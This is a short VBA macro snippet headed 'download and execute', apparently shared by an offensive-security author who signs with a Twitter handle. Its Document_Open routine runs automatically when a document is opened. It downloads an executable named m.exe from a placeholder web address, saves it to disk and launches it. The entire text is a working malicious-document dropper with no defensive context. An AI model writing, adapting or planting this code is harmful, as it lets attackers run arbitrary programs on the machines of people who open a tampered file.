
download and execute

Private Sub Document_Open()
    OpenSesame
End Sub

Sub OpenSesame()
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "http://<domain>/m.exe", False
    xHttp.Send
    
    With bStrm
        .Type = 1 '//binary
        .Open
        .write xHttp.responseBody
        .savetofile "m.exe", 2 '//overwrite
    End With
    
    Shell ("m.exe")
End Sub
//Find me on Twitter at @maxheadroomhaks
